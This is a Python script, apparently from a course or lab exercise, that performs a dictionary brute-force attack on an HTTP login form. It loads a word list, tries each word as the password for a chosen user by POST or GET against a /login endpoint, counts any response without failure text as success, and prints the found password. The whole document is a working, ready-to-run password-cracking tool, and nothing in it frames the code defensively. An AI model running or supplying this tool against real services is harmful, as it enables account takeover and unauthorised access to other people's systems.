"""
@Author: Dickson Alexander and Jason Peng
"""

import argparse, requests, time, re, sys
from requests.exceptions import RequestException

def try_password(session, url, username, password, method="POST"):
    """
    Try to login with the given username and password using the specified method.
    Returns the response object.
    """
    if method.upper() == "POST":
        data = {"username": username, "password": password}
        r = session.post(url, data=data, timeout=2)
    else:
        r = session.get(url, params={"username": username, "password": password}, timeout=2)
    return r

def looks_like_success(resp):
    """
    Check if the login attempt was successful based on the response.  Returns True if successful, False otherwise.
    """
    # If no response, treat as failure
    if resp is None:
        return False
    body = resp.text or ""
    # If 401 response, or unauthorized text in the body fail early
    if resp.status_code == 401: 
        return False
    if "Login failed" in body or "Invalid username or password" in body or "Unauthorized" in body:
        return False
    # else treat as success; 
    return True

def main():
    p = argparse.ArgumentParser()
    p.add_argument("--host", required=True)
    p.add_argument("--port", required=True, type=int)
    p.add_argument("--user", required=True)
    p.add_argument("--dict", required=True, help="english_words.txt")
    p.add_argument("--sleep", type=float, default=0.15, help="delay between requests")
    p.add_argument("--method", choices=["POST","GET"], default="POST", help="Try POST or GET fallback")
    args = p.parse_args()

    # Setup the session based off the capture we saw on wireshark
    base = f"http://{args.host}:{args.port}"
    login_url = f"{base}/login"
    session = requests.Session()
    session.headers.update({"User-Agent":"crack-script/1.0"})

    # Load the passwords from the dictionary file (in this case english_words.txt)
    try:
        with open(args.dict, "r", encoding="utf-8", errors="ignore") as fh:
            words = [w.strip() for w in fh if w.strip()]
    except FileNotFoundError:
        print("dictionary file not found")
        sys.exit(1)

    # Loop through the passwords and try each one
    print(f"Trying {len(words)} passwords against {login_url} as {args.user}")
    for i, pw in enumerate(words, 1):
        try:
            r = try_password(session, login_url, args.user, pw, method=args.method)
        except RequestException as e:
            print(f"[{i}/{len(words)}] network error for '{pw}': {e}")
            time.sleep(args.sleep)
            continue

        if looks_like_success(r):
            print("=== SUCCESS ===")
            print("username:", args.user)
            print("password:", pw)
            print("status:", r.status_code)
            print("response snippet:\n", (r.text[:400]).replace("\n","\\n"))
            return
        else:
            if i % 50 == 0:
                print(f"[{i}/{len(words)}] still trying ... last tried: {pw}") # progress update every 50 attempts
        time.sleep(args.sleep)

    print("exhausted dictionary without success")

if __name__ == "__main__":
    main()